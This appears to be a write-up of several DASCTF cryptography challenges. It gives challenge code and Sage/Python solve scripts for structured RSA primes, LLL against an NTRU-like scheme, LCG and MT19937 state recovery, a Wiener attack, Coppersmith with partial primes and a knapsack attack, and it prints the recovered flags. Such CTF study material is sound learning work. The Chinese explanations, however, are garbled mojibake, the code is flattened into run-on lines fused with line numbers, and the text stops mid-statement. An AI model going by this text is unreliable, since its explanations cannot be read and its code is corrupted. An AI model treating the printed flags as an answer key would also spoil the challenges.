20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223e = 11079917583c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766def get_key(a, nbit): assert a &gt;= 2 while True: X = getRandomInteger(nbit // a) s = pow(2, a ** 2 - a + 5) # å–å¯èƒ½çš„æœ€å¤§å€¼ p = X ** a + s if isPrime(p): return (p, s) for a in range(2,20): p, s = get_key(a,1024) if s.bit_length() &lt; 34: # s &lt; e print(a, p.bit_length(), s.bit_length()) # 2 1021 8# 3 1012 12# 4 1020 18 $a=4$ æ—¶æ»¡è¶³ $e=s \\cdot t$ çš„ä½æ•°æ¡ä»¶ï¼Œæœ‰ $s \\in [2^{a^2-a+4},2^{a^2-a+5})=[65536,131072)$ã€‚ åˆ†è§£ $e$ï¼Œå°è¯•å…¶å„å› å­ï¼Œæ±‚ $s,t$ï¼š 123456789101112131415a = 4# s ~ (65536,131072)# e = 3 Â· 7^2 Â· 19 Â· 691 Â· 5741ed = [1, 3, 7, 19, 21, 49, 57, 133, 147, 399, 691, 931, 2073, 2793, 4837, 5741, 13129, 14511, 17223, 33859, 39387, 40187, 91903, 101577, 109079, 120561, 275709, 281309, 327237, 643321, 763553, 843927, 1929963, 2290659, 3967031, 5344871, 11901093, 16034613, 27769217, 75373589, 83307651, 194384519, 226120767, 527615123, 583153557, 1582845369, 3693305861, 11079917583]for k in ed: if k in range(65536,131072): s = k t = e // s if t in range(65536,131072) and t &gt; s: print((s,t)) # (91903, 120561)# (101577, 109079) å¸¦å…¥æœ‰ $p=X_1^4+s,q=X_2^4+t$ï¼Œåˆ $X_1^4 \\gt\\gt s,X_2^4 \\gt\\gt t$ï¼Œæœ‰ $(X_1X_2)^4 \\approx N$ï¼Œå³ $X_1X_2= \\lfloor\\sqrt[4]{N}\\rfloor$ã€‚ç»“åˆ $N=pq=(X_1^4+s)(X_2^4+t)$ï¼Œè§£ $X_1,X_2$ï¼š 1234567891011121314151617181920212223242526272829303132333435363738import gmpy2st = [(91903, 120561), (101577, 109079)]N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223e = 11079917583c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766s = int(st[0][0]) # å¦ä¸€ç»„æ— è§£t = int(st[0][1])y = int(gmpy2.iroot(N,4)[0])P.&lt;x1,x2&gt; = PolynomialRing(ZZ)f1 = (x1^4+s)*(x2^4+t)-Nf2 = x1*x2-yg = f1.resultant(f2, x2)X2 = g.univariate_polynomial().roots()[0][0]X1 = y//X2print((X1,X2))p = X1^4+sq = X2^4+tif not is_prime(p): p = X2^4+s q = X1^4+tprint(is_prime(p))print(is_prime(q))# AMMfor mp in GF(p)(c).nth_root(e, all=True): for mq in GF(q)(c).nth_root(e, all=True): m = crt([ZZ(mp), ZZ(mq)], [p, q]) try: res = bytes.fromhex(hex(m)[2:]) if res.isascii(): print(res) except: pass # b&#x27;DASCTF&#123;C0nsTruct!n9_Techn1qUe2_f0r_RSA_Pr1me_EnC2ypt10N&#125;&#x27; â€‹ Easy_3L 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from gmpy2 import *from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)def get_key(): p = getPrime(1400) f = getRandomNBitInteger(1024) while True: q = getPrime(512) if gcd(f, q) != 1: continue else: break h = (invert(f, p) * q) % p return p, hdef encrypt1(m): a = getPrime(250) b = getRandomNBitInteger(240) n = getPrime(512) seed = m s = [0] * 6 s[0] = seed for i in range(1, 6): s[i] = (s[i - 1] * a + b) % n return sdef encrypt2(msg, p, h): s = getRandomNBitInteger(512) c = (s * h + msg) % p return cs = encrypt1(m)print(&quot;S1 =&quot;, s[1])print(&quot;S2 =&quot;, s[2])print(&quot;S4 =&quot;, s[4])print(&quot;S5 =&quot;, s[5])p, h = get_key()c = encrypt2(s[3], p, h)print(&quot;p =&quot;, p)print(&quot;h =&quot;, h)print(&quot;c =&quot;, c)# S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141# S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888# S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997# S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736# p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351# h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711# c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287 encrypt1() å’Œ encrypt2() åˆ†åˆ«æ˜¯LCGå’ŒNTRUã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]f,g = -f,-gprint(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gS1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736s = [S1,S2,m,S4,S5]from functools import reducefrom math import gcddef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)n, a, b = crack_unknown_modulus(s)print(n)print(a)print(b)seed = (S1-b)*inverse_mod(a,n)%nprint(bytes.fromhex(hex(seed)[2:]))# b&#x27;DASCTF&#123;NTRU_L0G_a6e_S1mpLe&#125;&#x27; â€‹ SigninCrypto éšæœºæ•°çœŸéšæœºå—ï¼Ÿå¦‚éšï¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from random import *from Crypto.Util.number import *from Crypto.Cipher import DES3from flag import flagfrom key import keyfrom iv import ivimport osimport hashlibimport secretsK1= keyhint1 = os.urandom(2) * 8xor =bytes_to_long(hint1)^bytes_to_long(K1)print(xor)def Rand(): rseed = secrets.randbits(1024) List1 = [] List2 = [] seed(rseed) for i in range(624): rand16 = getrandbits(16) List1.append(rand16) seed(rseed) for i in range(312): rand64 = getrandbits(64) List2.append(rand64) with open(&quot;task.txt&quot;, &quot;w&quot;) as file: for rand16 in List1: file.write(hex(rand16)+ &quot;\\n&quot;) for rand64 in List2: file.write(hex((rand64 &amp; 0xffff) | ((rand64 &gt;&gt; 32) &amp; 0xffff) &lt;&lt; 16) + &quot;\\n&quot;)Rand()K2 = long_to_bytes(getrandbits(64))K3 = flag[:8]KEY = K1 + K2 + K3IV=ivIV1=IV[:len(IV)//2]IV2=IV[len(IV)//2:]digest1 = hashlib.sha512(IV1).digest().hex()digest2 = hashlib.sha512(IV2).digest().hex()digest=digest1+digest2hint2=(bytes_to_long(IV)&lt;&lt;32)^bytes_to_long(os.urandom(8))print(hex(bytes_to_long((digest.encode()))))print(hint2)mode = DES3.MODE_CBCdes3 = DES3.new(KEY, mode, IV)pad_len = 8 - len(flag) % 8padding = bytes([pad_len]) * pad_lenflag += paddingcipher = des3.encrypt(flag)ciphertext=cipher.hex()print(ciphertext)# 334648638865560142973669981316964458403# 0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833# 22078953819177294945130027344# a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1 3DESåŠ å¯†ï¼Œkeyç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œ$K_1$ æ ¹æ®ä¸åŒä½æ•°å¼‚æˆ–å¾—åˆ°randomçš„ä¸¤ä¸ªå­—èŠ‚å€¼ï¼Œ$K_2$ åˆ©ç”¨MT19937ç®—æ³•è®¡ç®—è¾“å‡ºå€¼ï¼Œ$K_3$ ä¸ºflagå‰å…«ä½ï¼Œå³ &#39;DASCTF&#123;&#39;+?ï¼Œå…±éœ€çˆ†ç ´1ä¸ªå¯è§å­—ç¬¦ï¼›8å­—èŠ‚ivï¼Œç”±sha512ç»“æœçŸ¥å‰å4å­—èŠ‚ç›¸åŒï¼Œç”±hint2çŸ¥ï¼Œivå³ç§»4å­—èŠ‚åé”™ä½å¼‚æˆ–ï¼Œhint2é«˜4ä½å³ä¸º4å­—èŠ‚ivå€¼ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import stringimport itertoolsfrom mt19937predictor import MT19937Predictorfrom Crypto.Util.number import *from Crypto.Cipher import DES3from tqdm import *s1 = [...]s2 = [...]predictor = MT19937Predictor()for i in range(312): x = (s1[2*i+1]&lt;&lt;48) | ((s2[i]&gt;&gt;16)&lt;&lt;32) | (s1[2*i]&lt;&lt;16) | (s2[i]&amp;0xffff) predictor.setrandbits(x, 64)K2 = long_to_bytes(predictor.getrandbits(64))print(K2)import hashlibd = bytes.fromhex(&#x27;62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833&#x27;)d1 = d[:128]d2 = d[128:]print(d1)print(d2)print(d1==d2)xor = 334648638865560142973669981316964458403hint2 = 22078953819177294945130027344c = bytes.fromhex(&#x27;a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1&#x27;)hint1 = bytes_to_long(long_to_bytes(xor&gt;&gt;112)*8)K1 = long_to_bytes(hint1 ^ xor)print(K1)iv = hint2&gt;&gt;(8*8)IV = long_to_bytes(iv)*2print(IV)for k3 in trange(128): K3 = b&#x27;DASCTF&#123;&#x27;+bytes([k3]) KEY = K1 + K2 + K3 des3 = DES3.new(KEY, DES3.MODE_CBC, IV) m = des3.decrypt(c) if m.startswith(b&#x27;DASCTF&#123;&#x27;): print(m) # b&#x27;DASCTF&#123;8e5ee461-f4e1-4af2-8632-c9d62f4dc073&#125;&#x27; â€‹ esyRSA å¥½åƒè¿™ä¸ªRSAæœ‰ç‚¹æ€ªå•Šï¼ç§é’¥ç»™ä½ äº†ï¼æˆ‘çš„eå‘¢ï¼Ÿ 1234567891011121314151617from gmpy2 import invertfrom md5 import md5from secret import p, qe = ?????n = p*qphi = (p-1)*(q-1)d = invert(e, phi)ans = gcd(e,phi)print n, e, dprint &quot;Flag: DASCTF&#123;%s&#125;&quot; %md5(str(p + q)).hexdigest()&quot;&quot;&quot;n = 8064259277274639864655809758868795854117113170423331934498023294296505063511386001711751916634810056911517464467899780578338013011453082479880809823762824723657495915284790349150975180933698827382368698861967973964030509129133021116919437755292590841218316278732797712538885232908975173746394816520256585937380642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913&quot;&quot;&quot; $n$ ç›´æ¥ç»™å¾—æœ‰é—®é¢˜ï¼Œé‡å¤äº†ä¸€éï¼Œå·¨å‘ã€‚ æ­£ç¡®çš„ $n=$80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373 $n$ ä¸ $d$ ä½æ•°ç›¸è¿‘ï¼Œ$e$ å¾ˆå°ï¼ŒWiener Attack /çˆ†ç ´/æ±‚ $e$ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263n = d = def rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return de = crack_rsa(d, n)print(e)# 13521 å†å·²çŸ¥ $n,e,d$ æ±‚ $p,q$ï¼š 1234567891011121314151617181920212223242526import randomimport gmpy2from hashlib import md5def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p)n = 80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913e = 13521p, q = divide_pq(e, d, n)print(&quot;Flag: DASCTF&#123;%s&#125;&quot; %md5(str(p + q).encode()).hexdigest())# Flag: DASCTF&#123;4ae33bea90f030bfddb7ac4d9222ef8f&#125; â€‹ MCeorpkpleer è¿™æ•°æ®éƒ½ä¸å…¨è¦æ€ä¹ˆè®¡ç®—å‘¢ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from Crypto.Util.number import *from secret import flagdef pubkey(list, m, w): pubkey_list = [] for i in range(len(e_bin)): pubkey_list.append(w * list[i] % m) return pubkey_listdef e_cry(e, pubkey): pubkey_list = pubkey encode = 0 for i in range(len(e)): encode += pubkey_list[i] * int(e[i]) % m return encodep = getPrime(1024)q = getPrime(1024)n = p * qe = getPrime(64)m = bytes_to_long(flag)c = pow(m, e, n)e_bin = (bin(e))[2:]list = [pow(3, i) for i in range(len(e_bin))]m = getPrime(len(bin(sum(list))) - 1)w = getPrime(64)pubkey = pubkey(list, m, w)en_e = e_cry(e_bin, pubkey)print(&#x27;p = &#123;&#125;\\n&#x27; &#x27;n = &#123;&#125;\\n&#x27; &#x27;c = &#123;&#125;\\n&#x27; &#x27;pubkey = &#123;&#125;\\n&#x27; &#x27;en_e = &#123;&#125;&#x27;.format((p &gt;&gt; 435) &lt;&lt; 435, n, c, pubkey, en_e))&#x27;&#x27;&#x27;p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]en_e = 31087054322877663244023458448558&#x27;&#x27;&#x27; æ ¹æ®å·²çŸ¥ $p$ é«˜ä½ï¼Œç”¨coppersmithç®—æ³•æ¢å¤ $p$ã€‚ å¯¹äº $e$ï¼Œå·²çŸ¥ $s_i = w \\cdot 3^i \\bmod m$ï¼Œå·²çŸ¥ $3^i$ å’Œ $s_i$ï¼ŒæœªçŸ¥ $w$ å’Œ $m$ã€‚ ç”± $\\begin{cases} s_i = w \\cdot 3^i \\bmod m \\newline s_{i+1} = w \\cdot 3^{i+1} \\bmod m \\end{cases}$ï¼Œå³ $\\begin{cases} w \\cdot 3^i = s_i+k_1m \\newline w \\cdot 3^{i+1} = s_{i+1}+k_2m \\end{cases}$ï¼Œ ä¸¤å¼ç›¸é™¤ï¼Œå¾— $(3s_i-s_{i+1})=(3k_1-k_2)m=km$ï¼Œæ•…æ±‚gcdå¯å¾— $m$ï¼Œå†æŒ‰èƒŒåŒ…å¯†ç æ±‚è§£ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465ph = N = c = pk = [...]ec = PR.&lt;x&gt; = PolynomialRing(Zmod(N))f = ph + xpl = f.small_roots(X=2^435, beta=0.4)[0]p = int(ph+pl)q = N//pm = 0for i in range(len(pk)-1): m = gcd(m, 3*pk[i]-pk[i+1])print(m)w = pk[0]*inverse_mod(3^0,m)%mprint(w)ct = ecn = len(pk)# Sanity check for application of low density attackd = n / log(max(pk), 2)print(CDF(d))assert CDF(d) &lt; 0.9408M = Matrix.identity(n) * 2last_row = [1 for x in pk]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)last_col = pklast_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.BKZ()sol = []for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) breaks = sole = int(&#x27;&#x27;.join([str(k) for k in s]),2)print(e)print(e.bit_length())print(is_prime(e))f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,N)print(bytes.fromhex(hex(m)[2:]))b&#x27;DASCTF&#123;T81I_tPPS_6r7g_xlPi_OO3M_6vyV_Rkba&#125;&#x27; â€‹ XORè´¯ç©¿å§‹ç»ˆ ä¸€åˆ‡éƒ½æ˜¯æœ‰æ„ä¹‰çš„ï¼Œæ‹¿ä¸‹å®ƒå§ã€‚ massege.txt ä¸­ä¸ºç¤¾ä¼šä»·å€¼è§‚ç¼–ç ï¼Œè§£ç å¾—å‹ç¼©åŒ…å¯†ç ï¼šC0ngr4tulati0n5_y0u_fou^d_m3ï¼Œæ³¨é‡Šï¼šé’¥åŒ™å…ˆåˆ«æ‰”æ‰ï¼Œä¸‡ä¸€åé¢è¿˜æœ‰ç”¨å‘¢ã€‚ task.pyï¼š 123456789101112131415161718from gmpy2 import gcdfrom Crypto.Util.number import getPrimefrom secret import enflagp = getPrime(512)q = getPrime(512)n = q * pphi = (p - 1) * (q - 1)e = getPrime(17)assert gcd(e, phi) == 1# ä»¥ä¸Šä¿¡æ¯ç”Ÿæˆäº†ç§é’¥æ–‡ä»¶,ä½†æ–‡ä»¶è¢«æŸåäº†ä½ èƒ½æå–æœ‰ç”¨ä¿¡æ¯å—c = pow(enflag, e, n)print(&#x27;c = &#x27; + str(c))&#x27;&#x27;&#x27;c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818&#x27;&#x27;&#x27; pri.pemï¼š 123456789101112-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==-----END PRIVATE KEY----- æŒ‰ç…§ç§é’¥ç»“æ„ï¼Œå°†ç§é’¥base64è§£ç è½¬hexåˆ†æï¼š 12345678910111213141516171819202122232425262730820277 # å¤šä½™éƒ¨åˆ†0201 # å¤šä½™éƒ¨åˆ†00300d06092a864886f70d01010105000482 # å¤šä½™éƒ¨åˆ†02613082025d # å¼€å§‹: é•¿åº¦=0x025d0201 # ç‰ˆæœ¬ï¼šé•¿åº¦=0x0100028181 # nï¼šé•¿åº¦=0x8100b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913 # n0203 # eï¼šé•¿åº¦=0x03010001 # e028181 # dï¼šé•¿åº¦=0x8100974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361 # d0241 # pï¼šé•¿åº¦=0x4100ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9 # p0241 # qï¼šé•¿åº¦=0x4100cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb # q è§£RSAï¼š 123456789101112131415c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818p = 0x00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9q = 0x00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefbn = 0xb9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913e = 0x10001print(is_prime(p))print(is_prime(q))f = (p-1)*(q-1)d = 